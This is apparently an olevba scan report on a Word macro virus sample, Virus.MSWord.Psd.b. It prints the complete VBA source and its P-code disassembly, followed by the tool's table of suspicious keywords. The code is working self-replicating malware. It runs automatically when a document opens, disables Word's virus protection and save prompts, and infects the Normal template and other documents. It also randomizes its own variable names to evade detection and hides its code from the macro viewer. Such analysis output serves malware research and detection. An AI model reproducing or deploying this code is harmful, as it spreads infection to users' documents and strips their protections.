olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For TM3491 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next TM3491: End If
UL9644 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
DI771 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OK2648 = ActiveDocument.VBProject.VBComponents.Item(1)
OL775 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OK2648 = NormalTemplate.VBProject.VBComponents.Item(1)
UE6878 = True
Call VH9821_RV1023
ActiveDocument.Saved = True
End If
If UE6878 <> True And OL775 <> True Then GoTo NP935
If UE6878 = True Then OK2648.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UL9644 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OL775 = True Then OK2648.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DI771 - 4))
NP935:
If DI771 <> 0 And UL9644 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function VH9821_RV1023()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "RU3433": r1(2) = "DC2077": r1(3) = "AE9067": r1(4) = "MB1957": r1(5) = "RV1023": r1(6) = "UL9644"
r1(7) = "DI771": r1(8) = "OL775":: r1(9) = "OK2648": r1(10) = "UE6878": r1(11) = "NP935": r1(12) = "VH9821": r1(13) = "RE6659": r1(14) = "PQ7662": r1(15) = "TM3491"
For TM3491 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RV1023(a1, r1(TM3491))
Next TM3491
End Function 'VAMP v1.0 [thanks Vic!]
Private Function RV1023(PQ7662, RE6659 As String)
On Error Resume Next
Dim RU3433 As Long: Dim DC2077 As Long: Dim AE9067 As Long: Dim MB1957 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
RU3433 = 1: DC2077 = 1: AE9067 = .CountOfLines: MB1957 = Len(.Lines(.CountOfLines, 1))
Do While .Find(RE6659, RU3433, DC2077, AE9067, MB1957, True)
strline = .Lines(RU3433, 1)
strline = Left(strline, DC2077 - 1) & PQ7662 & Mid(strline, MB1957)
.replaceline RU3433, strline
RU3433 = AE9067 + 1: DC2077 = 1:
AE9067 = .CountOfLines
MB1957 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Psd.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5782 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld TM3491 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #7:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #8:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #9:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld TM3491 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UL9644 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DI771 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set OK2648 
' Line #14:
' 	LitVarSpecial (True)
' 	St OL775 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set OK2648 
' Line #18:
' 	LitVarSpecial (True)
' 	St UE6878 
' Line #19:
' 	ArgsCall (Call) VH9821_RV1023 0x0000 
' Line #20:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld UE6878 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld OL775 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NP935 
' 	EndIf 
' Line #23:
' 	Ld UE6878 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld UL9644 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "Application.Quit SaveChanges:=wdDoNotSaveChanges"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld OK2648 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #24:
' 	Ld OL775 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld DI771 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld OK2648 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #25:
' 	Label NP935 
' Line #26:
' 	Ld DI771 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld UL9644 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #29:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #30:
' 	EndSub 
' 	QuoteRem 0x0008 0x003F "W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]"
' Line #31:
' 	FuncDefn (Private Function VH9821_RV1023(id_FFFE As Variant))
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	ArgsCall Read 0x0000 
' Line #34:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	VarDefn r1 (As String)
' Line #35:
' 	LitStr 0x0006 "RU3433"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "DC2077"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AE9067"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "MB1957"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RV1023"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "UL9644"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #36:
' 	LitStr 0x0005 "DI771"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "OL775"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "OK2648"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "UE6878"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "NP935"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "VH9821"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RE6659"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PQ7662"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "TM3491"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' Line #37:
' 	StartForVariable 
' 	Ld TM3491 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #38:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #39:
' 	Ld a1 
' 	Ld TM3491 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) RV1023 0x0002 
' Line #40:
' 	StartForVariable 
' 	Ld TM3491 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #42:
' 	FuncDefn (Private Function RV1023(PQ7662, RE6659 As String, id_FFFE As Variant))
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	Dim 
' 	VarDefn RU3433 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn DC2077 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn AE9067 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn MB1957 (As Long)
' Line #45:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #46:
' 	LitDI2 0x0001 
' 	St RU3433 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St DC2077 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St AE9067 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St MB1957 
' Line #47:
' 	Ld RE6659 
' 	Ld RU3433 
' 	Ld DC2077 
' 	Ld AE9067 
' 	Ld MB1957 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #48:
' 	Ld RU3433 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #49:
' 	Ld strline 
' 	Ld DC2077 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PQ7662 
' 	Concat 
' 	Ld strline 
' 	Ld MB1957 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #50:
' 	Ld RU3433 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' 	Ld AE9067 
' 	LitDI2 0x0001 
' 	Add 
' 	St RU3433 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St DC2077 
' 	BoS 0x0000 
' Line #52:
' 	MemLdWith CountOfLines 
' 	St AE9067 
' Line #53:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St MB1957 
' Line #54:
' 	Loop 
' Line #55:
' 	EndWith 
' Line #56:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

